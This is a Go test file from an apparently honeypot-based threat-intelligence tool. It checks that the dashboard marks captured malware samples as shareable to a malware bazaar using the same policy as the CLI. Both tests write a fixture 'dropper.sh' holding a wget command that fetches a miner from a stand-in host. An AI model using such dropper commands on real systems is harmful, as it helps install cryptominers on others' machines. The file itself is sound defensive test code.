package web

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/networkshard/shardlure/internal/intel/bazaar"
	"github.com/networkshard/shardlure/internal/store"
)

// TestPayloadsShareableUsesBazaarPolicy pins that the payloads API answers
// shareability itself, from the real bazaar policy, rather than shipping an
// origin string for the client to guess from.
//
// The dashboard's isUploadEligible used to re-derive the gate in JavaScript:
// `origin.indexOf('download') !== -1`. That does not match "quarantine_fetch",
// the capture runner's own fetch — precisely the novel-threat provenance Vet
// accepts. Worse, the aggregated row carries the NEWEST row's origin, and the
// same payload is routinely recorded by both the cowrie hook and our fetch, so a
// payload won or lost its share button on which sighting happened to land last.
// On the reference deployment two family-identified droppers (Traffmonetizer,
// Komari) had no button while `share bazaar` was selecting them.
//
// The fixture is that exact shape: a mixed-origin payload whose newest row is
// the quarantine fetch.
func TestPayloadsShareableUsesBazaarPolicy(t *testing.T) {
	s := newIntelTestServer(t, nil)

	dir := t.TempDir()
	onDisk := filepath.Join(dir, "dropper.sh")
	if err := os.WriteFile(onDisk, []byte("#!/bin/sh\nwget http://x/miner\n"), 0o600); err != nil {
		t.Fatal(err)
	}

	now := time.Now().UTC()
	rows := []store.Artifact{
		// Mixed-origin payload, quarantine_fetch newest — the shape that broke.
		{URL: "http://x/mixed-a", SHA256: "aa", LocalPath: onDisk, SizeBytes: 8192,
			Origin: "cowrie_download", Status: "fetched", TS: now.Add(-2 * time.Hour)},
		{URL: "http://x/mixed-b", SHA256: "aa", LocalPath: onDisk, SizeBytes: 8192,
			Origin: "quarantine_fetch", Status: "fetched", TS: now.Add(-1 * time.Hour)},
		// Quarantine-only payload: invisible under the old LIKE '%download%'.
		{URL: "http://x/quarantined", SHA256: "bb", LocalPath: onDisk, SizeBytes: 4096,
			Origin: "quarantine_fetch", Status: "fetched", TS: now.Add(-3 * time.Hour)},
		// 217 B dropper: above bazaar's 64 B floor, below the old 1024 pre-filter.
		{URL: "http://x/small", SHA256: "cc", LocalPath: onDisk, SizeBytes: 217,
			Origin: "cowrie_download", Status: "fetched", TS: now.Add(-4 * time.Hour)},
		// TTY transcript: hard-rejected by Vet, must never get a button.
		{URL: "http://x/tty", SHA256: "dd", LocalPath: onDisk, SizeBytes: 65536,
			Origin: "cowrie_tty", Status: "fetched", TS: now.Add(-5 * time.Hour)},
		// Sub-floor junk.
		{URL: "http://x/sentinel", SHA256: "ee", LocalPath: onDisk, SizeBytes: 1,
			Origin: "cowrie_download", Status: "fetched", TS: now.Add(-6 * time.Hour)},
	}
	for _, a := range rows {
		if err := s.st.RecordArtifact(a); err != nil {
			t.Fatalf("RecordArtifact(%s): %v", a.URL, err)
		}
	}

	w := httptest.NewRecorder()
	s.handleIntelPayloads(w, httptest.NewRequest(http.MethodGet, "/api/intel/payloads?window=24h&limit=100", nil))
	if w.Code != http.StatusOK {
		t.Fatalf("GET /api/intel/payloads → %d: %s", w.Code, w.Body.String())
	}
	var out struct {
		Rows []struct {
			SHA256    string `json:"sha256"`
			Origin    string `json:"origin"`
			Shareable bool   `json:"shareable"`
		} `json:"rows"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &out); err != nil {
		t.Fatalf("decode: %v", err)
	}
	got := map[string]bool{}
	origins := map[string]string{}
	for _, r := range out.Rows {
		got[r.SHA256] = r.Shareable
		origins[r.SHA256] = r.Origin
	}

	if origins["aa"] != "quarantine_fetch" {
		t.Fatalf("fixture no longer reproduces the bug: aa's reported origin = %q, want "+
			"quarantine_fetch (the newest row, and the origin the old JS filter missed)",
			origins["aa"])
	}
	for _, tc := range []struct {
		sha, why string
		want     bool
	}{
		{"aa", "mixed-origin payload: one of its rows is a plain cowrie_download, so the " +
			"CLI ships it — the button must not depend on which sighting was newest", true},
		{"bb", "quarantine_fetch is the capture runner's own fetch, which Vet accepts by " +
			"provenance; `origin LIKE '%download%'` never matched it", true},
		{"cc", "217 B dropper: bazaar's floor is 64 B, and a real dropper script is " +
			"routinely a few hundred bytes", true},
		{"dd", "tty transcript, hard-rejected by Vet", false},
		{"ee", "1-byte sentinel, below the size floor", false},
	} {
		if got[tc.sha] != tc.want {
			t.Errorf("payload %s: shareable = %v, want %v — %s", tc.sha, got[tc.sha], tc.want, tc.why)
		}
	}

	// The API's verdict must equal what the CLI would actually select, evaluated
	// through the same exported policy. If these drift again, the dashboard and
	// `share bazaar` disagree about which payloads exist — the original finding.
	cands, err := s.st.ArtifactsForShare(now.Add(-24*time.Hour), store.SharePolicy{
		MinBytes: bazaar.MinSampleBytes,
		Origins:  bazaar.ShareableOrigins(),
	})
	if err != nil {
		t.Fatal(err)
	}
	cliSet := map[string]bool{}
	for _, c := range cands {
		cliSet[c.SHA256] = true
	}
	for sha, shareable := range got {
		if shareable != cliSet[sha] {
			t.Errorf("payload %s: API shareable=%v but CLI selects=%v", sha, shareable, cliSet[sha])
		}
	}
}

// TestPayloadDetailShareableIsGroupLevel covers the detail modal, which resolves
// its row with GetArtifactBySHA — the newest row. Without a group-level verdict
// it showed "not eligible: not a download" on exactly the payloads the library
// offered a button for.
func TestPayloadDetailShareableIsGroupLevel(t *testing.T) {
	s := newIntelTestServer(t, nil)

	dir := t.TempDir()
	onDisk := filepath.Join(dir, "dropper.sh")
	if err := os.WriteFile(onDisk, []byte("#!/bin/sh\nwget http://x/miner\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	now := time.Now().UTC()
	for _, a := range []store.Artifact{
		{URL: "http://x/mixed-a", SHA256: "aa", LocalPath: onDisk, SizeBytes: 8192,
			Origin: "cowrie_download", Status: "fetched", TS: now.Add(-2 * time.Hour)},
		{URL: "http://x/mixed-b", SHA256: "aa", LocalPath: onDisk, SizeBytes: 8192,
			Origin: "quarantine_fetch", Status: "fetched", TS: now.Add(-1 * time.Hour)},
		{URL: "http://x/tty", SHA256: "dd", LocalPath: onDisk, SizeBytes: 65536,
			Origin: "cowrie_tty", Status: "fetched", TS: now.Add(-5 * time.Hour)},
		// Newest row is a FAILED re-fetch over a payload we already have. The
		// modal loads that row, so a per-row verdict answers "no file" and hides
		// the button on a sample the library offers. The reference deployment has
		// this shape (quarantine_fetch: 12 fetched, 1 failed).
		{URL: "http://x/refetch-ok", SHA256: "ff", LocalPath: onDisk, SizeBytes: 5120,
			Origin: "cowrie_download", Status: "fetched", TS: now.Add(-8 * time.Hour)},
		{URL: "http://x/refetch-failed", SHA256: "ff", LocalPath: "", SizeBytes: 0,
			Origin: "quarantine_fetch", Status: "failed", TS: now.Add(-7 * time.Hour)},
	} {
		if err := s.st.RecordArtifact(a); err != nil {
			t.Fatal(err)
		}
	}

	// Returns the newest row's origin and status (what the modal actually
	// renders) alongside the server's group-level verdict.
	detail := func(sha string) (origin, status string, shareable bool) {
		t.Helper()
		w := httptest.NewRecorder()
		s.handleIntelPayload(w, httptest.NewRequest(http.MethodGet, "/api/intel/payload?sha="+sha, nil))
		if w.Code != http.StatusOK {
			t.Fatalf("GET /api/intel/payload?sha=%s → %d: %s", sha, w.Code, w.Body.String())
		}
		var out struct {
			Origin    string `json:"origin"`
			Status    string `json:"status"`
			Shareable bool   `json:"shareable"`
		}
		if err := json.Unmarshal(w.Body.Bytes(), &out); err != nil {
			t.Fatalf("decode: %v", err)
		}
		return out.Origin, out.Status, out.Shareable
	}

	origin, _, shareable := detail("aa")
	if origin != "quarantine_fetch" {
		t.Fatalf("fixture broken: detail origin = %q, want quarantine_fetch", origin)
	}
	if !shareable {
		t.Error("detail modal says the mixed-origin payload is not shareable — it must " +
			"answer for the whole sha group, not the newest row it happens to load")
	}
	if _, _, ttyShareable := detail("dd"); ttyShareable {
		t.Error("detail modal offers a share button for a tty transcript")
	}

	// The partial-group case: the row the modal loaded is a failed re-fetch, but
	// the payload's bytes are on disk from an earlier fetched row. A verdict
	// derived from the loaded row alone says "not fetched" here.
	_, ffStatus, ffShareable := detail("ff")
	if ffStatus != "failed" {
		t.Fatalf("fixture broken: ff's newest status = %q, want failed", ffStatus)
	}
	if !ffShareable {
		t.Error("detail modal hides the button on a payload whose newest row is a failed " +
			"re-fetch — the verdict must cover every row for the sha, and an earlier row " +
			"has the bytes on disk")
	}
}
